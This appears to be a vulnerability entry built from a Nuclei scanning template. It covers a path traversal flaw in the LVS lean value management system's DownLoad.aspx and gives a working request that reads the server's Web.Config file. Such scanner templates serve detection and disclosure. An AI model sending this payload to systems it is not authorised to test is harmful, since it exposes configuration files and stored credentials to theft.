# Nuclei Template: LVS DownLoad.aspx - Local File Inclusion (LFI)
**Template ID:** lvs-download-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`lvs-download-lfi.yaml`)

## Vulnerability Information & PoC

## Description
LVS lean value management system DownLoad.aspx has an arbitrary file reading vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/Business/DownLoad.aspx?p=UploadFile/../Web.Config
```

## References
- https://github.com/wy876/POC/blob/main/LVS%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FDownLoad.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md#lvs%E7%B2%BE%E7%9B%8A%E4%BB%B7%E5%80%BC%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdownloadaspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E
